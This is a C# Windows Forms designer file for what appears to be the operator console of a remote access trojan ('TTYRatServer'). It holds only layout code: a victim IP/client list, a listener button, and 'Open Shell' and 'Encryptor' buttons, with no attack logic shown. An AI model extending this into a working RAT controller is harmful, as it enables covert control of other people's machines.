using System.ComponentModel;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace TTYRatServer
{
    partial class Menu
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }

            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.Shell = new System.Windows.Forms.Button();
            this.iplist = new System.Windows.Forms.ListView();
            this.IPs = new System.Windows.Forms.ColumnHeader();
            this.Ports = new System.Windows.Forms.ColumnHeader();
            this.clientID = new System.Windows.Forms.ColumnHeader();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.openShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.getipButton = new System.Windows.Forms.Button();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.listenerStatus = new System.Windows.Forms.ToolStripStatusLabel();
            this.button1 = new System.Windows.Forms.Button();
            this.encryptor = new System.Windows.Forms.Button();
            this.portBox = new System.Windows.Forms.TextBox();
            this.contextMenuStrip1.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.SystemColors.Control;
            this.textBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.textBox1.Enabled = false;
            this.textBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 24F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte) (0)));
            this.textBox1.Location = new System.Drawing.Point(43, 30);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(120, 37);
            this.textBox1.TabIndex = 1;
            this.textBox1.Text = "IP LIST";
            // 
            // Shell
            // 
            this.Shell.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte) (0)));
            this.Shell.Location = new System.Drawing.Point(43, 315);
            this.Shell.Name = "Shell";
            this.Shell.Size = new System.Drawing.Size(170, 102);
            this.Shell.TabIndex = 2;
            this.Shell.Text = "Open Shell\r\n";
            this.Shell.UseVisualStyleBackColor = true;
            this.Shell.Visible = false;
            this.Shell.Click += new System.EventHandler(this.Shell_Click);
            // 
            // iplist
            // 
            this.iplist.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.iplist.Alignment = System.Windows.Forms.ListViewAlignment.Left;
            this.iplist.AllowColumnReorder = true;
            this.iplist.AutoArrange = false;
            this.iplist.BackColor = System.Drawing.SystemColors.InactiveCaptionText;
            this.iplist.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {this.IPs, this.Ports, this.clientID});
            this.iplist.ContextMenuStrip = this.contextMenuStrip1;
            this.iplist.ForeColor = System.Drawing.Color.Lime;
            this.iplist.FullRowSelect = true;
            this.iplist.Location = new System.Drawing.Point(43, 71);
            this.iplist.Margin = new System.Windows.Forms.Padding(1);
            this.iplist.MultiSelect = false;
            this.iplist.Name = "iplist";
            this.iplist.Size = new System.Drawing.Size(610, 221);
            this.iplist.TabIndex = 1;
            this.iplist.Tag = "";
            this.iplist.TileSize = new System.Drawing.Size(180, 30);
            this.iplist.UseCompatibleStateImageBehavior = false;
            this.iplist.View = System.Windows.Forms.View.Details;
            this.iplist.DoubleClick += new System.EventHandler(this.iplist_DoubleClick);
            // 
            // IPs
            // 
            this.IPs.Text = "Client IP Adress";
            this.IPs.Width = 245;
            // 
            // Ports
            // 
            this.Ports.Text = "Ports";
            this.Ports.Width = 109;
            // 
            // clientID
            // 
            this.clientID.Text = "Clients IDs";
            this.clientID.Width = 252;
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {this.openShellToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(134, 26);
            // 
            // openShellToolStripMenuItem
            // 
            this.openShellToolStripMenuItem.Name = "openShellToolStripMenuItem";
            this.openShellToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
            this.openShellToolStripMenuItem.Text = "Open Tools";
            // 
            // checkBox1
            // 
            this.checkBox1.Location = new System.Drawing.Point(657, 43);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(117, 25);
            this.checkBox1.TabIndex = 7;
            this.checkBox1.Text = "Allow Debug Mode";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // getipButton
            // 
            this.getipButton.Location = new System.Drawing.Point(657, 77);
            this.getipButton.Name = "getipButton";
            this.getipButton.Size = new System.Drawing.Size(131, 49);
            this.getipButton.TabIndex = 8;
            this.getipButton.Text = "Open Listener 56";
            this.getipButton.UseVisualStyleBackColor = true;
            this.getipButton.Click += new System.EventHandler(this.getipButton_Click);
            // 
            // statusStrip1
            // 
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {this.listenerStatus});
            this.statusStrip1.Location = new System.Drawing.Point(0, 428);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(800, 22);
            this.statusStrip1.TabIndex = 9;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // listenerStatus
            // 
            this.listenerStatus.Name = "listenerStatus";
            this.listenerStatus.Size = new System.Drawing.Size(39, 17);
            this.listenerStatus.Text = "Ready";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(658, 177);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(130, 53);
            this.button1.TabIndex = 10;
            this.button1.Text = "button1";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Visible = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // encryptor
            // 
            this.encryptor.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte) (0)));
            this.encryptor.Location = new System.Drawing.Point(237, 315);
            this.encryptor.Name = "encryptor";
            this.encryptor.Size = new System.Drawing.Size(200, 102);
            this.encryptor.TabIndex = 11;
            this.encryptor.Text = "Encryptor";
            this.encryptor.UseVisualStyleBackColor = true;
            this.encryptor.Visible = false;
            this.encryptor.Click += new System.EventHandler(this.button2_Click);
            // 
            // textBox2
            // 
            this.portBox.Location = new System.Drawing.Point(658, 135);
            this.portBox.Name = "portBox";
            this.portBox.Size = new System.Drawing.Size(129, 20);
            this.portBox.TabIndex = 12;
            // 
            // Menu
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.portBox);
            this.Controls.Add(this.encryptor);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.getipButton);
            this.Controls.Add(this.checkBox1);
            this.Controls.Add(this.iplist);
            this.Controls.Add(this.Shell);
            this.Controls.Add(this.textBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.ImeMode = System.Windows.Forms.ImeMode.On;
            this.Name = "Menu";
            this.Text = "CYB3R-T4YN3";
            this.Shown += new System.EventHandler(this.Menu_Shown);
            this.contextMenuStrip1.ResumeLayout(false);
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private System.Windows.Forms.TextBox portBox;

        private System.Windows.Forms.ToolStripMenuItem openShellToolStripMenuItem;

        private System.Windows.Forms.Button encryptor;

        private System.Windows.Forms.Button button1;

        public System.Windows.Forms.ColumnHeader clientID;

        private System.Windows.Forms.ToolStripStatusLabel listenerStatus;

        private System.Windows.Forms.StatusStrip statusStrip1;

        private System.Windows.Forms.Button getipButton;

        private ColumnHeader Ports;

        private System.Windows.Forms.CheckBox checkBox1;

        private System.Windows.Forms.ColumnHeader IPs;

        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

        private System.Windows.Forms.ListView iplist;

        private System.Windows.Forms.Button Shell;

        private System.Windows.Forms.TextBox textBox1;

        #endregion
    }
}